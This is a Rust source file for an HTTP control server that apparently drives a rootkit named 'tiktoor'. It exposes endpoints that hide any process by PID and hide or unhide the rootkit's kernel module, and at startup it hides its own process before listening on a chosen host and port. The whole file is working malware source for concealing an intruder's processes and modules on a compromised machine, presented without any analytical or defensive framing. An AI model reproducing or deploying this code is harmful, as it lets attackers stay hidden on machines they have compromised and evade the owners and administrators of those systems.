use actix_web::{post, web, App, HttpResponse, HttpServer, Responder};
use serde::Deserialize;
use std::process;
use structopt::StructOpt;

/// A CLI tool for communicating with tiktoor
#[derive(StructOpt)]
struct Cli {
    /// Bind host
    #[structopt(long, short)]
    host: String,
    /// Bind port
    #[structopt(long, short)]
    port: u16,
}

#[derive(Deserialize)]
struct HideProcessParameter {
    pid: u32,
}

#[post("/hide_process")]
async fn hide_process(parameter: web::Json<HideProcessParameter>) -> impl Responder {
    tiktoor_client::hide_process(parameter.pid);
    HttpResponse::Ok()
}

#[post("/hide_module")]
async fn hide_module() -> impl Responder {
    tiktoor_client::hide_module();
    HttpResponse::Ok()
}

#[post("/unhide_module")]
async fn unhide_module() -> impl Responder {
    tiktoor_client::unhide_module();
    HttpResponse::Ok()
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let cli = Cli::from_args();

    // hide myself
    tiktoor_client::hide_process(process::id());

    HttpServer::new(|| {
        App::new()
            .service(hide_process)
            .service(hide_module)
            .service(unhide_module)
    })
    .bind((cli.host, cli.port))?
    .run()
    .await
}
